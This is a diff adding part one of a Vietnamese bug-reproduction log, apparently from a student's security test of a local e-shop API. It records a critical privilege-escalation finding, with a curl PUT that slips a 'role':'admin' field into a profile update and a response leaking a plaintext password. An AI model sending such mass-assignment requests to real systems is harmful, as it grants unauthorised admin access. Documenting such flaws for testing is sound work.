@@ -1,0 +1,11 @@
+Tai hien loi — SUT: http://localhost:3000/api
+Thoi diem   : 2026-09-02 16:20:53 +0700
+Student ID  : 23127195 (moi request deu mang header X-Student-Id)
+
+### BUG-A1-01 [Critical] SEC-06 — leo quyen len admin qua PUT /api/users/me   (phan 1/2)
+
+$ curl -s -X PUT $B/users/me $H -H 'Authorization: Bearer $USER_TOKEN' -d '{"name":"Test User","shipping_address":"1 Le Loi","phone":"0912345678","role":"admin"}'
+{"message":"Profile updated"}   role hien tai sau lenh tren:
+
+$ curl -s $B/users/me $H -H 'Authorization: Bearer $USER_TOKEN'
+{"id":2,"name":"Test User","email":"test@eshop.com","password":"Test1234!","role":"admin","login_attempts":0,"locked_until":null,"reset_token":null,"shipping_address":"1 Le Loi","phone":"0912345678"}   dang nhap lai — JWT moi mang role gi?
